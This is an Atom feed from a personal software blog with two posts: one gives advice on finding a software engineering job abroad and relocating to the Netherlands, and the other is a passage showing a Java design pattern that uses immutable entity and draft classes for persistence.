<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <id>https://vy.github.io//</id>
  <title>Volkan Yazıcı's Soap Co.</title>
  <updated>2015-05-12T16:23:00Z</updated>
  <link rel="alternate" href="https://vy.github.io//"/>
  <link rel="self" href="https://vy.github.io//blog/feed/"/>
  <author>
    <name>Volkan Yazıcı</name>
    <uri>https://vy.github.io/</uri>
  </author>
  <entry>
    <id>tag:vy.github.io,2015-05-12://blog/post/2015/05/12/finding-a-job-abroad/</id>
    <title type="html">Finding a Software Engineering Job Abroad</title>
    <published>2015-05-12T16:23:00Z</published>
    <updated>2015-05-12T16:23:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2015/05/12/finding-a-job-abroad/"/>
    <content type="html">
&lt;p&gt;On the way back to the Netherlands from my PhD defence in Turkey, I wanted to
share a couple of my personal experiences for those who are on the pursuit of
finding a software engineering job abroad. I will proceed in a Q&amp;amp;A form; feel
free to continue reading from whichever part you wish.&lt;/p&gt;

&lt;h1 id="who-am-i"&gt;Who am I?&lt;/h1&gt;

&lt;p&gt;I migrated from Turkey to the Netherlands for a software engineering position
at &lt;a href="bol.com"&gt;bol.com&lt;/a&gt; – the biggest e-commerce platform in the Netherlands
and Belgium. I have a BS in mathematics, MS and PhD in computer engineering.
That being said, I had several job experiences in various half- and full-time
positions in parallel to my education. Right now, I work as a full-time
Software Engineer and my daily programming routine is constituted of a blend
of Java, Scala, and SQL kung-fu.&lt;/p&gt;

&lt;h1 id="what-is-the-influence-of-a-computer-science-related-educational-background-on-job-finding"&gt;What is the influence of a computer science related educational background on job finding?&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;Almost none.&lt;/em&gt; I can assure you none of my programming related enthusiasm or
job opportunuity potential emanates from my educational background, but my
interest in the field. That is, I had always found programming a joy and I
still do. I have been programming while I was at high school or even nights
while working in a catering shop kitchen to make my school stipend. Put
another way, programming is not something I perform due to financial
necessities or whatsoever. And this is what makes most out of you as a
software developer vacancy candidate. Nevertheless, for certain positions
(management, researcher, etc.) companies can ask for a degree partly due to
the official requirements.&lt;/p&gt;

&lt;p&gt;So, does this mean all these university certificates did not worth a dime
during job search? No, it certainly did. First of all, HR people (the first
official company entry point that yourself will be exposed to) are not
developers and university degree one of very few things that they can have
clue about the candidate. Nevertheless, here is the gist: If you are good at
your job enough, you can put up a resume that can create more or less the same
effect a university degree can do.&lt;/p&gt;

&lt;h1 id="how-did-i-search-for-a-job"&gt;How did I search for a job?&lt;/h1&gt;

&lt;p&gt;I followed a path composed of two major steps.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Over the years, I had a certain idea about software companies that I met
through Hacker News, Proggit, Stack Overflow, DZone, or similar programming
related news channels. And I enriched this set through similar companies
via LinkedIn as well. Note that I was not looking for a ticket out of the
country, but a decent company that can help me to improve my technical
skills. (Though I must admit that the Turkish political atmosphere with an
increasing tendency towards an Islamic dictatorship had its own
contribution on making up my mind too.) In more concrete terms, I did not
want to keep on earning my life by implementing yet another web service,
but by figuring out what it takes to write a web service that handles
millions of requests per second in a real-world market.&lt;/li&gt;
  &lt;li&gt;Next, I tried to make connections (via Twitter, FreeNode, business links,
etc.) to several people who already work in these companies as a software
engineer. Then, I scheduled meetings with these people (through various
channels; Skype, e-mail, IRC) to learn more about their personal
experiences and recommendations. In a nutshell, I talked with aroud 40
people around the world through Skype.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Here I need to note that the country was my second concern, while the job
itself is the first.&lt;/p&gt;

&lt;h1 id="what-did-i-ask-to-people-whom-i-consult-over-skype"&gt;What did I ask to people whom I consult over Skype?&lt;/h1&gt;

&lt;p&gt;During these meetings I tried to let people provide as much information as
possible about the job, company, and the country. That is, I did neither
advertise myself, nor ask for a job by any means. These talks were merely for
the purpose of scratching the surface of what it feels to be a developer over
there.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What does their daily programming routine consist of? (Which programming
languages, software technologies they use? Do they have a decent VCS
convention? Do they take advantage of SCRUM and CI? Is the overall
architecture Windows or Linux/BSD based?)&lt;/li&gt;
  &lt;li&gt;What are the pros/cons of the job and the company? (What does social
environment look like? What about working hours, salary ranges, pension
schemes, holidays, commuting/vacation/relocation allowances, health
insurances?)&lt;/li&gt;
  &lt;li&gt;What are the things that he/she likes/dislikes about the job?
(Intellectually challenging enough projects? Demotivating managers? Fresh
college graduates? About to be retired Oracle developers? Quick and dirty
architectural decisons that save the day?)&lt;/li&gt;
  &lt;li&gt;What is his/her programming background? (Is he a &lt;em&gt;programmer&lt;/em&gt; or yet another
employee using programming as a tool to earn his/her life. How long has
he/she been working at the company?)&lt;/li&gt;
  &lt;li&gt;What are the career opportunuties? (If you are inclined to move on into the
realm of management.)&lt;/li&gt;
  &lt;li&gt;Are there any (preferably technical) blogs of the employees that I can access?&lt;/li&gt;
  &lt;li&gt;How does it feel to live in that country? (Taxes,
accomodation/utility/commuting costs, social integration of expats, etc.)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id="how-did-i-rank-the-open-positions"&gt;How did I rank the open positions?&lt;/h1&gt;

&lt;p&gt;I put together an excel sheet of around 50 company positions and a dozen of
countries. Then I scored each of them over a multitude of features that I set
in the columns. After reducing the size of options to a handful, I shared this
sheet (together with some personal comments) with people that I find
experienced in the field and have potential to shed some light on certain
pitfalls that I cannot oversee due to my inexperience.&lt;/p&gt;

&lt;h1 id="how-did-i-apply-to-the-positions"&gt;How did I apply to the positions?&lt;/h1&gt;

&lt;p&gt;First things first: Brush up your technical blog, GitHub and LinkedIn profiles
and put together a catchy CV. Note that nobody cares about your LaTeX kung-fu,
swimming enthusiasm, Excel skills, university TA-ships, college entrace exam
rankings, etc. Put yourself to the position of the HR staff and try hard to
think about what would you look for in a candidate. And one more thing: no
long texts. Nobody will read them, I can assure you.&lt;/p&gt;

&lt;p&gt;According to the feedback I collected from various sources around the internet
(Skype meetings, employee blogs, company profile and products, etc.) I connect
the pieces of the puzzle in my mind about the position and the required (both
technical and social) skills. Then I delivered a to-the-point cover letter (less
than a page) along with my CV (single page) to the relevant HR personal, if
possible through means of another programmer at the company. I would like to
emphasise two certain things here:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;I wrote a from scratch cover letter for every position. For sure there are
common parts among dozens of cover letters. That being said, every position
more or less has its distinguishing requirements and I tried to address
them as specifically as possible.&lt;/li&gt;
  &lt;li&gt;Both your cover letter and CV must be at most a single A4 with a readable
font size. Keep that in mind: The HR personal on the other side receives
dozens of such applications every day and is highly experienced to trash
out boring non-readable stuff.&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id="what-did-i-do-during-interviews"&gt;What did I do during interviews?&lt;/h1&gt;

&lt;p&gt;Following items are the highlights of things that I kept reminding myself
during the interviews:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Including the technical challenges (which I will not address in this blog
post), pay attentition to the what has been being asked for and answer to
&lt;em&gt;the&lt;/em&gt; question. If you do not understand the question, explain this clearly
and ask for further details.&lt;/li&gt;
  &lt;li&gt;Admit your mistakes and explain the reason behind it and how you can fix it
if you would have faced a similar problem next time.&lt;/li&gt;
  &lt;li&gt;Instead of bashing the interviewer with a particular solution of your
preference, try to understand his reasoning and discuss potential approaches
objectively.&lt;/li&gt;
  &lt;li&gt;Be precise about what you know and what you do not know. I personally would
not excuse any sort of dishonesty.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id="what-mistakes-did-i-do-about-the-relocation"&gt;What mistakes did I do about the relocation?&lt;/h1&gt;

&lt;p&gt;Realize that you are moving to another country. Given the fact that even the
handling of the utilities (gas, electricity, etc.) changes from a city to
another within the same country, think about the tremendous set of differences
that you will face cluelessly. Below you can find a short list of
miscalculations and unexpected obstacles that I experienced while relocating
to the Netherlands.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;I was expecting to find a house around €500, which I sadly figured out was
off around another €500, that is, €1000 in total.&lt;/li&gt;
  &lt;li&gt;Everybody speaks perfect English, but the entire official paperwork is in
Dutch. (Reminded me of &lt;a href="http://www.imdb.com/title/tt0335266/"&gt;Lost in
Translation&lt;/a&gt;.)&lt;/li&gt;
  &lt;li&gt;I spent almost a full week to get the govermental migration paperwork ready at
the town hall.&lt;/li&gt;
  &lt;li&gt;I figured out it was almost impossible to live without a bank card. (For the
first week, I paid people in cash at the company restaurant to buy something
for me to eat. It was more annoying then being an embarrassment.)&lt;/li&gt;
  &lt;li&gt;There are many alternative private companies that provide house utilities.
Finding one, collecting necessary forms, figuring out the right path of
mailings, etc. was a tormenting adventure for me – despite I was guided by
a professional expat agency hired by the company.&lt;/li&gt;
  &lt;li&gt;I spent a fortune for the housing, almost 5-6x more than I anticipated.&lt;/li&gt;
  &lt;li&gt;Commuting is quite expensive and problematic than I was expecting.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id="the-aftermath"&gt;The Aftermath&lt;/h1&gt;

&lt;p&gt;Here I will try to address some of the questions raised by the readers.&lt;/p&gt;

&lt;blockquote class="twitter-tweet" data-conversation="none" lang="en"&gt;
  &lt;p lang="tr" dir="ltr"&gt;
    &lt;a href="https://twitter.com/yazicivo"&gt;@yazicivo&lt;/a&gt; eline saglik. Neden
    Phd aldigin alan uzerine bir is/sirket secmedgini, gorusmelrde buna dair
    sorulr alip almdigini ekleyebilr msn?&lt;/p&gt;— Ferhat Aydın (@ferhtaydn)
    &lt;a href="https://twitter.com/ferhtaydn/status/602545230387290112"&gt;May 24,
    2015&lt;/a&gt;
&lt;/blockquote&gt;

&lt;p&gt;Well… What this Tweet roughly translates is this: &lt;strong&gt;Why didn’t I go for a
career aligned with my PhD study?&lt;/strong&gt; I actually tried really hard to go towards
that path. After all, thrashing out 5 years of experience on SDN was not also
an easy decision for me. I needed to think on this quite some time.
Nevertheless, it concluded with a bitter end.&lt;/p&gt;

&lt;p&gt;Over the years, I had quite some idea about the SDN companies in Europe. (I
did not want to go for United States for various personal reasons.) Further, I
checked hundreds of other candidates listed in &lt;a href="https://www.sdxcentral.com/"&gt;SDX
Central&lt;/a&gt;’s &lt;a href="https://www.sdxcentral.com/nfv-sdn-companies-directory/"&gt;NFV &amp;amp; SDN Companies
Directory&lt;/a&gt;. But a
majority of those companies were more or less like a black box. I mean, most
of them are startups and it was not visible what they are actually doing, what
are their products, what sort of a software ecosystem used internally, etc. Or
they just did not have any positions for backend developers. Long story short,
when I eliminated the companies that did not look like a suitable place for
me, I ended up with a handful of candidates. Further, I actually applied to
them. And guess what? None returned. I mean literally no responses.&lt;/p&gt;

&lt;p&gt;One particular exception was &lt;a href="http://www.tail-f.com/"&gt;Tail-f&lt;/a&gt;, which a month
later my application was &lt;a href="http://newsroom.cisco.com/release/1451764"&gt;acquired by
Cisco&lt;/a&gt;. I had heard about it a lot
in various SDN news channels, but after getting to know in a mail discussion
with &lt;a href="http://www.lukego.com/"&gt;Luke Gorrie&lt;/a&gt; that they employ hardcore
programming veterans in the field and Erlang is used behind the scenes, I felt
a strong interest in the job opportunities over there. And as with my other
SDN applications, I literally got no reply from this company too.&lt;/p&gt;

&lt;p&gt;All in all, I should also admit that the situation would be a lot different if
I would have considered job vacancies in United States.&lt;/p&gt;

&lt;blockquote class="twitter-tweet" data-conversation="none" lang="en"&gt;
  &lt;p lang="tr" dir="ltr"&gt;
    &lt;a href="https://twitter.com/yazicivo"&gt;@yazicivo&lt;/a&gt; abi "aradigimi
    buldum mu?", "simdi nelerden sikayet ediyorum?", "neyi
    farkli yapardim?" gibi sorularin cevaplarini da istiyoruz
    :)&lt;/p&gt;— sinan (@sinan1111111111) &lt;a href="https://twitter.com/sinan1111111111/status/602524691174182913"&gt;May
    24, 2015&lt;/a&gt;
&lt;/blockquote&gt;

&lt;p&gt;Sinan asks for &lt;strong&gt;Did I find what I was looking for? What am I complaining
right now? What would I do differently if I would have done it again?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I have mixed feelings on whether I found what I was looking for or not. And
there are some things I still complain and could be improved. That being said,
it is more or less ok and discussion of these subjects is out of the scope of
this post. If I would stick to the subject, &lt;em&gt;what would I have done
differently?&lt;/em&gt; I would have tried to get more information about the software
ecosystem and a working continuous integration cycle with all
commit-test-review cycles. But those would not add much to my previous
knowledge and not affect my decision, I believe. Additionally, I would have
surely made a more in-depth investigation on how much will I spend for
housing, where despite all my efforts, my estimations were way off.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2015-03-21://blog/post/2015/03/21/immutable-persistence/</id>
    <title type="html">Using Immutable Objects for Persistence in Java</title>
    <published>2015-03-21T13:39:00Z</published>
    <updated>2015-03-21T13:39:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2015/03/21/immutable-persistence/"/>
    <content type="html">
&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt; – A software design pattern to employ immutable classes for
persisting data models in Java. That is, you do not need to ruin your
immutable classes because of uncertain &lt;code&gt;id&lt;/code&gt; fields.&lt;/p&gt;

&lt;p&gt;When you want store a plain Java model in a data store, you are expected to
deliver an &lt;code&gt;@Id&lt;/code&gt; field to the underlying persistence framework.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Employee&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="nd"&gt;@Id&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="c1"&gt;// ...&lt;/span&gt;

&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This single &lt;em&gt;mutable&lt;/em&gt; field ruins all your immutable data structure model.
Why? You cannot add a &lt;code&gt;final&lt;/code&gt; modifier to an &lt;code&gt;id&lt;/code&gt; field, because you do not
know the &lt;code&gt;id&lt;/code&gt; yet before persisiting it to the data store.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="n"&gt;Employee&lt;/span&gt; &lt;span class="n"&gt;employee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Employee&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"bob"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;    &lt;span class="c1"&gt;// id = null&lt;/span&gt;
&lt;span class="n"&gt;employeeService&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;save&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;employee&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;             &lt;span class="c1"&gt;// id = 84357...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And this dirty bit propagates through all your code base and pollutes the
model space with mutable &lt;code&gt;id&lt;/code&gt; fields. Further, it becomes almost impossible to
differentiate whether a given &lt;code&gt;Employee&lt;/code&gt; instance actually represents a record
retrieved from the data store or just a temporal instance created by
application itself at some point in time. Actually, the entire deficiency is a
side effect of a misunderstanding: you are using the very same model to
encapsulate two different type of entities. One is a model draft, that is yet
to be saved. And the other one is an object that is associated with an
actually persisted object at the data store.&lt;/p&gt;

&lt;p&gt;&lt;img src="mutable.svg" alt="Mutable POJO Persistence Architecture"&gt;&lt;/p&gt;

&lt;h1 id="defining-the-problem-and-its-requirements"&gt;Defining the Problem and its Requirements&lt;/h1&gt;

&lt;p&gt;Before trying to come up with a practical solution to the problem at hand,
lets determine the set of constraints that needs to be satisfied in order to
use immutable data entities throughout the entire code base.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;An entity cannot be mutated by any means.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;An entity can only be instantiated by the data store service.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The first constraint ensures that the application cannot modify an entity,
hence you can freely pass it to around and enjoy the safety of your immutable
data structure. But the most important outcome of this scheme, which is
addressed in the second constraint, is that: You are guaranteed that an entity
&lt;em&gt;always&lt;/em&gt; represents a record retrived from the data store at some point in
time. That is, you know that it is not an artificially generated instance
created out of blue.&lt;/p&gt;

&lt;h1 id="the-proposal"&gt;The Proposal&lt;/h1&gt;

&lt;p&gt;After defining what we are looking for, we are ready to come up with a
practical solution. The solution I propose for this problem is a scheme such
that each &lt;code&gt;Employee&lt;/code&gt; entity is represented by two different encapsulations
throughout their entire lifetime:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code&gt;Employee&lt;/code&gt;: An immutable representation of a record retrieved from the data
store. Hence, it has an &lt;code&gt;id&lt;/code&gt; field as expected.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code&gt;EmployeeDraft&lt;/code&gt;: A yet to be persisted &lt;code&gt;Employee&lt;/code&gt; instance (&lt;em&gt;draft&lt;/em&gt;)
created either from scratch by the application or by updating an &lt;code&gt;Employee&lt;/code&gt;
instance. Since entity is still in the draft stage, it has no &lt;code&gt;id&lt;/code&gt; field.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code&gt;EmployeeService&lt;/code&gt;: The one and only one entry point that can create an
&lt;code&gt;Employee&lt;/code&gt; service.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src="immutable.svg" alt="Immutable POJO Persistence Architecture"&gt;&lt;/p&gt;

&lt;h1 id="the-code"&gt;The Code&lt;/h1&gt;

&lt;p&gt;I will start by implementing the &lt;code&gt;EmployeeDraft&lt;/code&gt; class:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vlkan&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;immutableentity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;repository&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;employee&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;static&lt;/span&gt; &lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;google&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;common&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;base&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Preconditions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;checkArgument&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;static&lt;/span&gt; &lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;google&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;common&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;base&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Preconditions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;checkNotNull&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="cm"&gt;/** Can only be instantiated through a builder. */&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="nf"&gt;EmployeeDraft&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;checkNotNull&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"name cannot be null"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;checkArgument&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;salary&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"salary cannot be negative, found: %d"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;checkNotNull&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"surname cannot be null"&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;surname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;salary&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;getSurname&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;getSalary&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Builder&lt;/span&gt; &lt;span class="nf"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Builder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Builder&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

        &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="cm"&gt;/** Note that the default constructor is only visible to the package classes. */&lt;/span&gt;
        &lt;span class="n"&gt;Builder&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{}&lt;/span&gt;

        &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="nf"&gt;Builder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EmployeeDraft&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;surname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;surname&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;salary&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;salary&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;Builder&lt;/span&gt; &lt;span class="nf"&gt;name&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;

